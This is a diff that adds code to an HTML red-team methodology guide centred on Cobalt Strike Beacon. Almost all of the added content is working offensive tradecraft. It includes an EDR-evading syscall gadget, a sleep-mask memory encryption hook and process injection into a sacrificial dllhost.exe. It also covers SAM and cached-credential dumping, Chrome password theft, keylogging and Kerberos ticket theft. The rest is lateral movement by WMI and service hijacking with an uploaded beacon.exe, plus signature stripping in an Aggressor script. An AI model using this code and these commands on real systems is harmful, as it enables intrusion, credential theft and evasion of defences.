+    for (DWORD i = 0; i &lt; text-&gt;Misc.VirtualSize - 2; i++) {
+        // syscall = 0F 05, ret = C3
+        if (start[i] == 0x0F &amp;&amp; start[i+1] == 0x05 &amp;&amp; start[i+2] == 0xC3)
+            return &amp;start[i];
+    }
+    return NULL;
+}
+
+// 3. Execute: set SSN in eax, args in registers, JMP to gadget
+// The return address on the stack points into ntdll — clean for EDR stack walks</code></pre>
 <p><strong>References:</strong> <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a></p>
 
 <h4 id="methodology-runtime-memory-obfuscation">11.4.3 Memory Obfuscation</h4>
@@ -6869,6 +6987,49 @@ addhook "CoCreateInstance"    "_hook_CoCreateInstance"</code></pre>
       </ul>
     </li>
   </ul>
+<pre><code class="language-c">// Sleep Mask — encrypt Beacon memory during sleep (PICO Sleep hook)
+void WINAPI _hook_Sleep(DWORD dwMilliseconds) {
+    // 1. Generate a random key for this sleep cycle
+    BYTE key[16];
+    BCryptGenRandom(NULL, key, sizeof(key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+
+    // 2. Walk Beacon PE sections and XOR-encrypt each one
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(beaconNtHeaders);
+    for (WORD i = 0; i &lt; beaconNtHeaders-&gt;FileHeader.NumberOfSections; i++) {
+        LPBYTE secAddr = beaconBase + sec[i].VirtualAddress;
+        DWORD  secSize = sec[i].Misc.VirtualSize;
+
+        // Flip to RW so we can encrypt executable sections
+        DWORD oldProt;
+        VirtualProtect(secAddr, secSize, PAGE_READWRITE, &amp;oldProt);
+
+        // XOR encrypt in place
+        for (DWORD j = 0; j &lt; secSize; j++)
+            secAddr[j] ^= key[j % sizeof(key)];
+    }
+
+    // 3. Actually sleep
+    pRealSleep(dwMilliseconds);
+
+    // 4. Decrypt and restore original section permissions
+    sec = IMAGE_FIRST_SECTION(beaconNtHeaders);
+    for (WORD i = 0; i &lt; beaconNtHeaders-&gt;FileHeader.NumberOfSections; i++) {
+        LPBYTE secAddr = beaconBase + sec[i].VirtualAddress;
+        DWORD  secSize = sec[i].Misc.VirtualSize;
+        for (DWORD j = 0; j &lt; secSize; j++)
+            secAddr[j] ^= key[j % sizeof(key)];
+
+        DWORD protect = PAGE_READONLY;
+        if (sec[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE)
+            protect = PAGE_EXECUTE_READ;
+        else if (sec[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE)
+            protect = PAGE_READWRITE;
+        VirtualProtect(secAddr, secSize, protect, &amp;oldProt);
+    }
+
+    // 5. Zero the key — never leave it in memory
+    SecureZeroMemory(key, sizeof(key));
+}</code></pre>
 
 <p><strong>General references:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a></p>
 
@@ -6940,6 +7101,38 @@ process-inject {
       </ul>
     </li>
   </ul>
+<pre><code class="language-c">// PROCESS_INJECT_SPAWN BOF hook — controls fork-and-run injection
+// Called when Beacon runs execute-assembly, powerpick, etc.
+void go(char* args, int alen) {
+    datap parser;
+    BeaconDataParse(&amp;parser, args, alen);
+
+    // 1. Create sacrificial process (suspended)
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+    CreateProcessA(NULL, "C:\\Windows\\System32\\dllhost.exe",
+        NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);
+
+    // 2. Allocate memory in the remote process (RW, not RWX)
+    LPVOID remoteBuf = VirtualAllocEx(pi.hProcess, NULL, payloadSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    // 3. Write the post-ex DLL
+    WriteProcessMemory(pi.hProcess, remoteBuf, payload, payloadSize, NULL);
+
+    // 4. Flip to RX before execution
+    DWORD oldProt;
+    VirtualProtectEx(pi.hProcess, remoteBuf, payloadSize,
+        PAGE_EXECUTE_READ, &amp;oldProt);
+
+    // 5. Set thread start to a clean address
+    //    ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x2c"
+    //    (configured in the Aggressor script)
+
+    // 6. Resume the thread
+    ResumeThread(pi.hThread);
+}</code></pre>
 
 <h4 id="methodology-postex-tool-sig-strip">11.5.3 Tool Signature Stripping</h4>
   <ul>
@@ -7337,6 +7530,23 @@ Rubeus asktgt /user:admin /domain:domain.com /certificate:cert.pfx /password:pfx
       </ul>
     </li>
   </ul>
+<pre><code class="language-bash"># SAM dump via registry save (requires SYSTEM)
+reg save HKLM\SAM C:\Windows\Temp\sam.bak
+reg save HKLM\SYSTEM C:\Windows\Temp\sys.bak
+# Exfil and crack offline:
+impacket-secretsdump -sam sam.bak -system sys.bak LOCAL
+
+# Domain Cached Credentials (DCC2) — extract with mimikatz or secretsdump
+impacket-secretsdump -sam sam.bak -system sys.bak -security sec.bak LOCAL
+# Crack DCC2 hashes (slow — PBKDF2):
+hashcat -m 2100 dcc2.txt wordlist.txt
+
+# Chrome saved passwords (user context, requires DPAPI)
+SharpChrome logins /unprotect
+
+# Keylogging via Beacon
+keylogger [pid] [x86|x64]       # inject keylogger into a process
+# Output captured in Beacon's keystrokes tab</code></pre>
 
 <p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a> &middot; <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a></p>
 
@@ -7411,6 +7621,26 @@ Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show:false
       </ul>
     </li>
   </ul>
+<pre><code class="language-bash"># OPSEC-safe Kerberos workflow under EDR
+# 1. Create sacrificial logon session (avoids touching Beacon's session)
+Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show:false
+#    [+] ProcessID: 5412, LUID: 0x7a3bc2
+
+# 2. Extract ticket via BOF (inline, no child process)
+Rubeus triage                                   # list available tickets
+Rubeus dump /luid:0x3e7 /service:krbtgt /nowrap  # dump TGT
+
+# 3. Import into the sacrificial session (PTT goes through LSASS — expected traffic)
+Rubeus ptt /luid:0x7a3bc2 /ticket:doIFqj...
+
+# 4. Steal the sacrificial process token to operate as that identity
+steal_token 5412
+ls \\dc01\c$
+
+# 5. Clean up when done
+rev2self                                        # drop the stolen token
+Rubeus purge /luid:0x7a3bc2                     # purge tickets from the session
+kill 5412                                       # terminate sacrificial process</code></pre>
 
 <p><strong>General references:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a></p>
 
@@ -7440,6 +7670,21 @@ Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show:false
       </ul>
     </li>
   </ul>
+<pre><code class="language-bash"># WMI lateral movement — stage payload, then trigger remotely
+# 1. Upload payload to target via SMB
+upload C:\payloads\beacon.exe \\TARGET\C$\Windows\System32\svcmon.exe
+
+# 2. Remote execution via WMI (Beacon)
+remote-exec wmi TARGET C:\Windows\System32\svcmon.exe
+
+# 3. Alternative: PowerShell WMI one-liner (from attacker box)
+#    Uses Win32_Process.Create — executes as SYSTEM if run with DA creds
+Invoke-WmiMethod -Class Win32_Process -Name Create `
+  -ArgumentList "C:\Windows\System32\svcmon.exe" `
+  -ComputerName TARGET
+
+# 4. Indirect execution via LOLBAS to break parent-child chain
+remote-exec wmi TARGET "C:\Windows\System32\rundll32.exe C:\Windows\System32\svcmon.dll,Entry"</code></pre>
 
 <h4 id="methodology-lateral-movement-psexec-scshell">11.10.2 PsExec &amp; SCShell</h4>
   <ul>
@@ -7466,6 +7711,33 @@ Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show:false
       </ul>
     </li>
   </ul>
+<pre><code class="language-bash"># SCShell — hijack an existing stopped service instead of creating a new one
+# 1. Find a stopped service to hijack
+sc \\TARGET query state= inactive | findstr SERVICE_NAME
+
+# 2. Save original binPath for cleanup
+sc \\TARGET qc "SensorService" | findstr BINARY_PATH_NAME
+#    e.g. C:\Windows\System32\SensorService.dll
+
+# 3. Modify the service to point to your payload
+sc \\TARGET config "SensorService" binPath= "C:\Windows\System32\svcmon.exe"
+
+# 4. Start the hijacked service (executes payload as SYSTEM)
+sc \\TARGET start "SensorService"
+
+# 5. Cleanup — restore the original binPath and delete the payload
+sc \\TARGET config "SensorService" binPath= "C:\Windows\System32\SensorService.dll"
+del \\TARGET\C$\Windows\System32\svcmon.exe
+
+# PsExec-style with local path (not UNC — avoids the default PsExec signature)
+# 1. Upload payload via SMB
+upload C:\payloads\beacon.exe \\TARGET\C$\Windows\System32\svcmon.exe
+# 2. Create and start a service with a local path
+sc \\TARGET create SvcMon binPath= "C:\Windows\System32\svcmon.exe" start= demand
+sc \\TARGET start SvcMon
+# 3. Cleanup
+sc \\TARGET delete SvcMon
+del \\TARGET\C$\Windows\System32\svcmon.exe</code></pre>
 
 <h4 id="methodology-lateral-movement-beacon-tradecraft">11.10.3 Spawned Beacon Tradecraft</h4>
   <ul>
@@ -7497,6 +7769,30 @@ Rubeus createnetonly /program:C:\Windows\System32\cmd.exe /show:false
       </ul>
     </li>
   </ul>
+<pre><code class="language-bash"># Aggressor — BEACON_RDLL_GENERATE_LOCAL ensures every spawned Beacon
+# inherits the full Crystal Palace / PICO evasion pipeline
+set BEACON_RDLL_GENERATE_LOCAL {
+    local('$dll $pico');
+    $dll = $2;
+    # Apply all strrep_pad signature removals
+    $dll = strrep_pad($dll, "beacon.x64.dll",   "survey.x64.dll");
+    $dll = strrep_pad($dll, "ReflectiveLoader",  "UpdateCheckProc");
+    # Attach the Crystal Palace loader + PICO hooks
+    return build_crystal_palace($dll);
+}
+
+# Lateral movement: sign + move + execute
+# 1. Sign the payload (if WDAC enforced)
+signtool.exe sign /f cert.pfx /p password /fd SHA256 beacon.exe
+
+# 2. Upload via Beacon
+upload C:\payloads\beacon.exe \\TARGET\C$\Windows\System32\svcmon.exe
+
+# 3. Execute via service hijack or WMI
+remote-exec wmi TARGET "C:\Windows\System32\rundll32.exe C:\Windows\System32\svcmon.dll,DllMain"
+
+# 4. Confirm new Beacon checks in with full evasion
+#    Verify: sleep mask active, PICO hooks loaded, no RWX memory</code></pre>
 
 <h5>Evasion Layer Decision Table</h5>
 <table class="custom-table">
